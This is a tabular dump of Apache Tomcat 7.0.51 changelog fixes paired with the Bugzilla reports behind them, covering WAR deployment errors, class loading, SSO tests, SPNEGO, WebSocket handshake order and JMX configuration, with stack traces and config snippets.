1) When I use auto-deploy using the Tomcat Deployer 'deploy' ant task to a non-ROOT context name, such as /360Site, everything works as expected - war file is uploaded, decompressed to directory, and is immediately available.

2) When I use the manager HTML interface to upload the ROOT.war file by clicking the 'Select WAR file to upload' and then clicking 'deploy', everything works as expected.

However, 3) When I do exactly the same thing as #1 (tomcat auto deploy) but just change the 'path' variable from /360Store to /ROOT, here is what happens:
* WAR file appears in the webapps directory, but does not get expanded.
* The webapp is not running (I get a blank page when I go to the URL in the browser)
* I see these entries in the catalina.<date>.log (after doing the auto-deploy:


Dec 27, 2013 3:34:03 PM org.apache.catalina.startup.HostConfig deleteRedeployResources
INFO: Undeploying context []
Dec 27, 2013 3:34:03 PM org.apache.catalina.loader.WebappClassLoader clearReferencesJdbc
SEVERE: The web application [] registered the JDBC driver [com.mysql.jdbc.Driver] but failed to unregister it when the web application was stopped. To prevent a memory leak, the JDBC Driver has been forcibly unregistered.
Dec 27, 2013 3:34:03 PM org.apache.catalina.startup.HostConfig deployWAR
INFO: Deploying web application archive /var/lib/tomcat7/webapps/ROOT.war
Dec 27, 2013 3:34:04 PM org.apache.catalina.startup.ContextConfig init
SEVERE: Exception fixing docBase for context []
java.util.zip.ZipException: error in opening zip file
	at java.util.zip.ZipFile.open(Native Method)
	at java.util.zip.ZipFile.<init>(ZipFile.java:215)
	at java.util.zip.ZipFile.<init>(ZipFile.java:145)
	at java.util.jar.JarFile.<init>(JarFile.java:153)
	at java.util.jar.JarFile.<init>(JarFile.java:90)
	at sun.net.www.protocol.jar.URLJarFile.<init>(URLJarFile.java:93)
	at sun.net.www.protocol.jar.URLJarFile.getJarFile(URLJarFile.java:69)
	at sun.net.www.protocol.jar.JarFileFactory.get(JarFileFactory.java:88)
	at sun.net.www.protocol.jar.JarURLConnection.connect(JarURLConnection.java:122)
	at sun.net.www.protocol.jar.JarURLConnection.getJarFile(JarURLConnection.java:89)
	at org.apache.catalina.startup.ExpandWar.expand(ExpandWar.java:113)
	at org.apache.catalina.startup.ContextConfig.fixDocBase(ContextConfig.java:722)
	at org.apache.catalina.startup.ContextConfig.init(ContextConfig.java:843)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:387)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
	at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:110)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:139)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:633)
	at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:983)
	at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1660)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
	at java.util.concurrent.FutureTask.run(FutureTask.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:724)

Dec 27, 2013 3:34:04 PM org.apache.catalina.core.StandardContext resourcesStart
SEVERE: Error starting static Resources
java.lang.IllegalArgumentException: Invalid or unreadable WAR file : error in opening zip file
	at org.apache.naming.resources.WARDirContext.setDocBase(WARDirContext.java:138)
	at org.apache.catalina.core.StandardContext.resourcesStart(StandardContext.java:5055)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5235)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:633)
	at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:983)
	at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1660)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
	at java.util.concurrent.FutureTask.run(FutureTask.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:724)

Dec 27, 2013 3:34:04 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Error in resourceStart()
Dec 27, 2013 3:34:04 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Error getConfigured
Dec 27, 2013 3:34:04 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Context [] startup failed due to previous errors
Dec 27, 2013 3:34:14 PM org.apache.catalina.startup.HostConfig deleteRedeployResources
INFO: Undeploying context []
Dec 27, 2013 3:34:14 PM org.apache.catalina.startup.HostConfig deployWAR
INFO: Deploying web application archive /var/lib/tomcat7/webapps/ROOT.war
Dec 27, 2013 3:34:14 PM org.apache.catalina.startup.ContextConfig init
SEVERE: Exception fixing docBase for context []
java.util.zip.ZipException: error in opening zip file
	at java.util.zip.ZipFile.open(Native Method)
	at java.util.zip.ZipFile.<init>(ZipFile.java:215)
	at java.util.zip.ZipFile.<init>(ZipFile.java:145)
	at java.util.jar.JarFile.<init>(JarFile.java:153)
	at java.util.jar.JarFile.<init>(JarFile.java:90)
	at sun.net.www.protocol.jar.URLJarFile.<init>(URLJarFile.java:93)
	at sun.net.www.protocol.jar.URLJarFile.getJarFile(URLJarFile.java:69)
	at sun.net.www.protocol.jar.JarFileFactory.get(JarFileFactory.java:88)
	at sun.net.www.protocol.jar.JarURLConnection.connect(JarURLConnection.java:122)
	at sun.net.www.protocol.jar.JarURLConnection.getJarFile(JarURLConnection.java:89)
	at org.apache.catalina.startup.ExpandWar.expand(ExpandWar.java:113)
	at org.apache.catalina.startup.ContextConfig.fixDocBase(ContextConfig.java:722)
	at org.apache.catalina.startup.ContextConfig.init(ContextConfig.java:843)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:387)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
	at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:110)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:139)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:633)
	at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:983)
	at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1660)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
	at java.util.concurrent.FutureTask.run(FutureTask.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:724)

Dec 27, 2013 3:34:14 PM org.apache.catalina.core.StandardContext resourcesStart
SEVERE: Error starting static Resources
java.lang.IllegalArgumentException: Invalid or unreadable WAR file : error in opening zip file
	at org.apache.naming.resources.WARDirContext.setDocBase(WARDirContext.java:138)
	at org.apache.catalina.core.StandardContext.resourcesStart(StandardContext.java:5055)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5235)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:633)
	at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:983)
	at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1660)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
	at java.util.concurrent.FutureTask.run(FutureTask.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:724)

Dec 27, 2013 3:34:14 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Error in resourceStart()
Dec 27, 2013 3:34:14 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Error getConfigured
Dec 27, 2013 3:34:14 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Context [] startup failed due to previous errors
Dec 27, 2013 3:34:21 PM org.apache.catalina.startup.HostConfig deployWAR
INFO: Deploying web application archive /var/lib/tomcat7/webapps/ROOT.war
Dec 27, 2013 3:34:21 PM org.apache.catalina.startup.HostConfig deployWAR
SEVERE: Error deploying web application archive /var/lib/tomcat7/webapps/ROOT.war
java.lang.IllegalArgumentException: addChild:  Child name '' is not unique
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:887)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:633)
	at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:983)
	at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:548)
	at org.apache.catalina.startup.HostConfig.check(HostConfig.java:1468)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.apache.tomcat.util.modeler.BaseModelMBean.invoke(BaseModelMBean.java:301)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:819)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:801)
	at org.apache.catalina.manager.ManagerServlet.check(ManagerServlet.java:1447)
	at org.apache.catalina.manager.ManagerServlet.deploy(ManagerServlet.java:679)
	at org.apache.catalina.manager.ManagerServlet.doPut(ManagerServlet.java:437)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:650)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.filters.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:611)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:953)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:408)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1041)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:603)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:724)





* After the auto-deploy fails, I can go into the HTML manager page and click the 'start' button, and the webapp does successfully start (tested the URL in the browser), but the WAR file still does not get unpacked into a directory.


Doing the exact same thing to a different server running Tomcat 6.0.24 works correctly as expected.

Any ideas here? Here is what I've ruled out so far:
* I don't think it's a file permission issue (tomcat7 is the owner of the webapps directory, and everything works fine when run through the manager HTML interface).
* The ""Child name '' is not unique"" sounded promising, but I could not find any duplicate ROOT webapps - there is no ROOT.war file or directory in the webapps directory prior to running the auto-deploy; there is no ROOT.xml file in the conf/Catalina/localhost directory, nor are there any context elements defined in the server.xml file.
* I don't think that the .war file is corrupt - I can manually unzip the .war file in the webapps from the command line using the 'unzip' command, and as I pointed out in #2 above, everything works fine when it is uploaded using the manager HTML interface.

If it would help to spin up a temporary new Ubuntu deployment and provide credentials to reproduce the problem, I'd be happy to do that."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55937
Catalina|Tomcat 7.0.51 (violetagg)|fix|55943|Improve the implementation of the class loader check that prevents web applications from trying to override J2SE implementation classes. As part of this fix, refactor the way a null parent class loader is handled which enables a number of null checks and object creation calls to be removed. Note that this change means that, by default, the web application class loader is now a higher priority for loading classes than the system class loader. (markt)|Provide a way prevent  looking at the System classloader before the webapp classloaders|"I would like a way to prevent Tomcat from checking the System classloader before the webapp classloaders.  This would be useful when using the embedded Tomact API to produce isolated servlet containers.  

I ran in to some difficulty with this when I was adding Tomcat support to the SBT (Simple Build Tool) plugin: https://github.com/JamesEarlDouglas/xsbt-web-plugin

In particular I had an issue where SBT includes a version of the Scala standard library, on the system classpath, that has been run through Proguard.  This  was conflicting with web applications that were including their own version of the Scala standard library.  I was eventually able to work around this using this hack: https://github.com/JamesEarlDouglas/xsbt-web-plugin/commit/f8a9b149f0c7c87d7b6e8f862c493841d82ad90a However, it would be nice if there was a way to accomplish this that didn't involve such a hack.

I would be happy to submit a patch for this.  However, I would like some guidence on how the API should be changed to accomplish this.  Perhaps a new flag on the WebappLoader class?

Thanks"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55943
Catalina|Tomcat 7.0.51 (violetagg)|fix|55958|Differentiate between foo.war the WAR file and foo.war the directory. (markt)|Tomcat tries to deploy dir as zip archive even when it is a directory if the name ends with .war|Webapp deployment fails if the dirname ends with .war because it is automatically considered as zip archive.|https://bz.apache.org/bugzilla/show_bug.cgi?id=55958
Catalina|Tomcat 7.0.51 (violetagg)|fix|55960|Improve the single sign on (SSO) unit tests. Patch provided by Brian Burch. (markt)|TestSSOnonLoginAndBasicAuthenticator is flawed and incomplete|"Created attachment 31173 [details]
updated test class and new servlet test class

As the original author of this test class, I am embarrassed to have to open this bug report.

I started a code review and cleanup of this class some time ago, then tried to add some new test cases to examine the way the SSO Valve interacts with the standard Authenticators for a client that does not use cookies.

As my updated test class took shape, I started a thread on the users list called ""Single Signon without Cookies"". Based on this discussion, I removed a lot of my newly developed test cases because they were not needed. I was surprised because some of them completed ""successfully"" although I now realise they ought to have failed. After further investigation, I discovered that my original logic inadvertently allowed the client to return the SSO cookie even though instructed NOT to do so.

Once the tests were looking better, I decided to check the overall timing and found my new suite of 7 tests had an elapsed time of 290 seconds, while the current svn version completes in only 35 seconds. Long running times are unavoidable because two tests explore SSO and webapp session expiry.

One test case has to let a session expire and the shortest timeout is 1 minute. The other test has to let a session expire and prove that a longer-lived session preserves the SSO status. With an expiry granularity of 1 minute, the longer-lived session has to be expired after 2 more minutes. That means the test case will have run for nearly 4 minutes.

I do not understand why, in the svn (current) version, these two test cases always run to a successful completion. The remaining test cases do not expire sessions and all complete in less than 3 seconds, so the two expiry cases are waiting about 30 seconds between them. This simply isn't long enough.

What is worse, I noticed the setup methods for the two webapps call (Standard)Context.setSessionTimeout(int mins) with time arguments that are erroneously small numbers of seconds! The Tomcat code and documentation consistently define the session expiry argument to be a number of minutes, which means the short and long timeouts of 4 and 10 ""seconds"" would be interpreted as 4 and 10 MINUTES respectively, and so to work properly the current test ought to take about 20 minutes to complete, rather than the observed 35 seconds! I used a debugger to verify the two sessions have maxInactiveInterval set to 240 and 600 during one suspicious test.

I don't think it is productive to worry about the current versions of these tests, because I have significantly redeveloped the class and debugged it. The elapsed times of the test cases confirm they now work properly.

The new ""no cookies"" test case required a new variant of a test servlet which allows the client to supply a request parameter. This parameter is interpreted as a url which is to encoded and inserted into the HTML response. Thus the returned URL can be used by the client to continue using the established session.
   
The only downside was the increased elapsed time when compared to the broken version. Unfortunately, there is no simple way for a unit test to establish a shorter timeout than 60 seconds. This topic was discussed at length on the dev list - the most complete account is in Konstantin's post to ""Re: svn commit: r1415184"" on 4 December 2012.

The new version of the test class uses:
        ((ManagerBase) basicContext.getManager())
                .setProcessExpiresFrequency(MANAGER_EXPIRE_SESSIONS_FAST);
.. to ensure the sessions are expired as quickly as possible.

and:
        StandardSession.setMaxInactiveInterval(EXTRA_DELAY_SECS);
.. to force a quicker expiry of the session before waiting.

The new suite of tests complete in about 50 seconds, comparable to the old broken version, and only one quarter of the ""unkludged"" test time. Although the elapsed time could be trimmed a little bit more, I think the version I propose has a sensible resilience to variation in real-life timeouts.

The net result is an extensive change, but I cannot see how to implement it in smaller chunks because the changes are inter-dependent."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55960
Catalina|Tomcat 7.0.51 (violetagg)|fix|55974|Retain order when reporting errors and warnings while parsing XML configuration files. (markt)|Honor the order when reporting XML parsing errors and warnings in XmlErrorHandler class|"Originally reported in comment 1 of bug 55973.

o.a.t.util.descriptor.XmlErrorHandler class stores the errors and warnings in a HashSet. A hashset does not preserve ordering.

If there are several errors, then

a) When all errors are printed (e.g. via XmlErrorHandler#logFindings(...)), their order is random.

b) When only one error is reported (e.g. by code added in r1552826), the one error is chosen randomly.

The ordering can be preserved if the collection is stored as LinkedHashSet or an ArrayList. Is there a benefit of using a 'set' here, or a 'list' would suffice?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55974
Catalina|Tomcat 7.0.51 (violetagg)|fix|56013|Fix issue with SPNEGO authentication when using IBM JREs. IBM JREs only understand the option of infinite lifetime for Kerberos credentials. Based on a patch provided by Arunav Sanyal. (markt)|SpnegoAuthenticator not working in IBM JDK v7 for Kerberos due to incorrect credential lifetime|"Created attachment 31208 [details]
Unified GNU diff format of SpnegoAuthenticator.java and its updated version

Hi

SpnegoAuthenticator is not working with IBM JDK v7. The option GSSCredential.DEFAULT_LIFETIME specified while generating ticket creates the following exception:-

major code: 11, minor code: 0
    major string: General failure, unspecified at GSSAPI level
    minor string: Desired initLifetime zero or less)

However specifying GSSCredential.INDEFINITE_LIFETIME as lifetime of credential resolves the issue. 

I am attaching a patch which optionally chooses cred lifetime as indefinite or default depending on whether the JDK is IBM JDK or Oracle/Sun JDK. This patch is with respect to SpnegoAuthenticator.java of tomcat v 7.0.50

Impact of fix:-

1. If not fixed then Tomcat does not work out of the box for Spnego Authentication(Kerberos) for IBM JDK v7

2. The fix affects only IBM JDK and does not change the execution flow for Oracle/Sun JDK

Yours sincerely
Arunav Sanyal"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56013
Catalina|Tomcat 7.0.51 (violetagg)|fix|56016|When loading resources for XML schema validation, take account of the possibility that servlet-api.jar and jsp-api.jar may not be loaded by the same class loader. Patch by Juan Carlos Estibariz. (markt)|DigesterFactory.idFor(...) assumes that javax.servlet.jsp.resources.** are available from the same class loader that defines javax.servlet.ServletContext|"Created attachment 31214 [details]
Patch for DigesterFactory.ifFor(...) method to relax assumptions related to class loading

The idFor(String url) method in org.apache.tomcat.util.descriptor.DigesterFactory appears to try loading resources from the javax.servlet.jsp.resources package using the defining class loader of javax.servlet.ServletContext.

This is perfectly fine for standalone Tomcat, of course. However, in our application we run embedded Tomcat in an isolated class loader, which includes all of Tomcat's jar files _except_ servlet-api.jar. servlet-api.jar is part of the class loader that is a  parent of the class loader for the embedded Tomcat.

Tomcat 7.0.47 worked well in this setup. However in 7.0.50 we hit exceptions like the following:

java.lang.ExceptionInInitializerError
    at org.apache.catalina.startup.TldConfig.createTldDigester(TldConfig.java:94)
    at org.apache.catalina.startup.TldConfig.init(TldConfig.java:576)
    at org.apache.catalina.startup.TldConfig.lifecycleEvent(TldConfig.java:559)
    at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
    at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
    at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
    at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:110)
    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:139)
    at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
    at org.apache.catalina.core.ContainerBase.access$000(ContainerBase.java:133)
    at org.apache.catalina.core.ContainerBase$PrivilegedAddChild.run(ContainerBase.java:156)
    at org.apache.catalina.core.ContainerBase$PrivilegedAddChild.run(ContainerBase.java:145)
    at java.security.AccessController.doPrivileged(Native Method)
    at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:875)
    at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:634)
    [...]
Caused by: java.lang.NullPointerException
    at org.apache.tomcat.util.descriptor.DigesterFactory.idFor(DigesterFactory.java:107)
    at org.apache.tomcat.util.descriptor.DigesterFactory.<clinit>(DigesterFactory.java:59)
    ... 25 more 

The reason why the resource is not found is apparently that the class loader of ServletContext does not 'see' resources from jsp-api.jar.

We can work around that by placing jsp-api.jar into the same class loader that has servlet-api.jar, however this workaround is not ideal from our design perspective.

From the source of the idFor(...) method one could guess that the fallback attempt to find the requested resource in the javax.servlet.jsp.resources package is meant to look in jsp-api.jar. For that reason, would it be appropriate to perform the fallback lookup in the defining class loader of javax.servlet.jsp.JspContext? A patch file for the proposed fix is attached. If it is accepted please credit Juan Carlos Estibariz with it."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56016
Catalina|Tomcat 7.0.51 (violetagg)|fix|56025|When creating a WebSocket connection, always call ServerEndpointConfig.Configurator.getNegotiatedSubprotocol() and always create the EndPoint instance after calling ServerEndpointConfig.Configurator.modifyHandshake(). (markt)|Order of invocation of method of ServerEndpointConfig.Configurator|"The current order of invocation (from http://svn.apache.org/repos/asf/tomcat/trunk/java/org/apache/tomcat/websocket/server/UpgradeUtil.java) is:

checkOrigin()
getNegotiatedSubprotocol()
getEndpointInstance()
modifyHandshake()

JSR 356 is guilty for not specifying this order, but I believe a different order is more useful. 
Below I refer to ""the application"" as a subclass of the ServerEndpointConfig.Configurator implemented by end users.
I'd like to propose this new order:

modifyHandshake() as first: this allows applications to query/store information about the upgrade request (for example, the URI);

checkOrigin() as second: this allows applications to check the origin with more information available, because the request/response are available from the previous call and therefore checks of the origin against the request URI and/or other HTTP headers will be possible;

getNegotiatedSubprotocol() as third: this should be always invoked, while right now it is not invoked if the client does not specify the Sec-WebSocket-Protocol header; this is not ideal since the server may have been configured with a sub-protocol, but the application is never called to check what the client has sent;

getEndPointInstance() as last: there is no point in creating the endpoint if the other methods returned a failure, nor there is point to invoke any other method if this one returned null.

The current order also does not invoke method getNegotiatedExtensions(), but as far as I understand extensions are not yet supported.
I believe this method should be eventually invoked as fourth, before getEndPointInstance().

Thanks !"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56025
Catalina|Tomcat 7.0.51 (violetagg)|fix|56032|Ensure that the WebSocket connection is closed after an IO error or an interrupt while sending a WebSocket message. (markt)|WebSocket Endpoint onClose method not called when channel closed by thread interruption|When an interrupted thread uses the basic or asynchronous remote of a session to write, the underlying channel is closed (this is as expected); however, the onClose method of the associated endpoint is not called.  This can lead the server into believing the session is still active.  The only way I have gotten around it is to delegate the write methods to6 a thread that can't possibly be interrupted.|https://bz.apache.org/bugzilla/show_bug.cgi?id=56032
Catalina|Tomcat 7.0.51 (violetagg)|fix|56042|If a request in async mode has an error but has already been dispatched don't generate an error page in the ErrorReportValve so the dispatch target can handle it. (markt)|java.lang.IllegalStateException: Calling [asyncComplete()] is not valid for a request with Async state [MUST_DISPATCH]|"The issue appears if the response has been set before startAsync:

response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
AsyncContext asyncContext = request.startAsync(request, response);
asyncContext.dispatch();

You might wonder why would anyone do that? The actual scenario is a bit more complex. It involves a separate thread that completes very fast, even before startAsync is called. 
 
The resulting stack trace:
java.lang.IllegalStateException: Calling [asyncComplete()] is not valid for a request with Async state [MUST_DISPATCH]
	at org.apache.coyote.AsyncStateMachine.asyncComplete(AsyncStateMachine.java:227)
	at org.apache.coyote.http11.Http11Processor.actionInternal(Http11Processor.java:358)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:871)
	at org.apache.coyote.Request.action(Request.java:344)
	at org.apache.catalina.core.AsyncContextImpl.complete(AsyncContextImpl.java:92)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:140)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:953)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:409)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1044)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:607)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:313)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at java.lang.Thread.run(Thread.java:744)

The Servlet spec says: ""It is illegal to call startAsync if ..., or if the response has been committed and closed, ..."". 

If that is indeed the reason, a clear error should be raised, and startAsync not be allowed to proceed. Or perhaps it is an issue that can be fixed? For what it's worth it actually works in Jetty even though the spec says it is illegal."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56042
Catalina|Tomcat 7.0.51 (violetagg)|fix||Add missing javax.annotation.sql.* classes to annotations-api.jar. (markt)|||
Catalina|Tomcat 7.0.51 (violetagg)|fix||The type of logger attribute of Context MBean should be not org.apache.commons.logging.Log but org.apache.juli.logging.Log. (kfujino)|||
Catalina|Tomcat 7.0.51 (violetagg)|fix|56082|Fix a concurrency bug in JULI's LogManager implementation. (markt)|ConcurrentModificationException with org.apache.juli.ClassLoaderLogManager|"Created attachment 31267 [details]
Source to reproduce

In Tomcat, java.util.logging.LogManager.getLogManager() is in general an instance of org.apache.juli.ClassLoaderLogManager.

In a webapp, when iterating over the result of LogManager.getLogManager().getLoggerNames(), a ConcurrentModification can sometimes occur.

To reproduce :
- download attached test-1.0.zip
- run ""mvn clean package"" using Maven
- copy ""target/test-1.0.war"" into tomcat/webapps
- start Tomcat
- see a lot of ""Issue reproduced: java.util.ConcurrentModificationException"" in the System output

This webapp uses simple Logger.getLogger(String) and LogManager.getLoggerNames() in threads.
I my case, this is reproduced using Tomcat 7.0.42 and JDK 1.7. 

I suppose that a copy of the result could be made in org.apache.juli.ClassLoaderLogManager.getLoggerNames()"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56082
Catalina|Tomcat 7.0.51 (violetagg)|fix|56096|When the attribute rmiBindAddress of the JMX Remote Lifecycle Listener is specified it's value will be used when constructing the address of a JMX API connector server. Patch is provided by Jim Talbut. (violetagg)|Setting rmiBindAddress on JmxRemoteLifecycleListener prevents tomcat from starting|"Adding this Listener to the Server:
  <Listener className=""org.apache.catalina.mbeans.JmxRemoteLifecycleListener""
          rmiRegistryPortPlatform=""10001"" rmiServerPortPlatform=""10002"" rmiBindAddress=""${ip.address}"" />
Along with this setenv.sh:
CATALINA_OPTS=""${CATALINA_OPTS} -Dcom.sun.management.jmxremote.password.file=$CATALINA_HOME/conf/jmxremote.password""
CATALINA_OPTS=""${CATALINA_OPTS} -Dcom.sun.management.jmxremote.access.file=$CATALINA_HOME/conf/jmxremote.access""
CATALINA_OPTS=""${CATALINA_OPTS} -Dcom.sun.management.jmxremote.ssl=false""

Prevents tomcat from starting as the two RMI components cannot talk to each other, producing this error:
java.io.IOException: Cannot bind to URL [rmi://localhost:10001/jmxrmi]: javax.naming.ServiceUnavailableException [Root exception is java.rmi.ConnectException: Connection refused to host: localhost; nested exception is:



This is caused by the preparation of the URL in createServer, which doesn't take into account that rmiBindAddress has been used and useLocalPorts has not.
I believe that if useLocalPorts was used tomcat would start, but this would force different instances to use different ports, which is what I'm trying to avoid."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56096
Catalina|Tomcat 7.0.51 (violetagg)|fix||When environment entry with one and the same name is defined in the web deployment descriptor and with annotation then the one specified in the web deployment descriptor is with priority. (violetagg)|||
Catalina|Tomcat 7.0.51 (violetagg)|fix||Change default value of xmlBlockExternal attribute of Context. It is true now. (kkolinko)|||
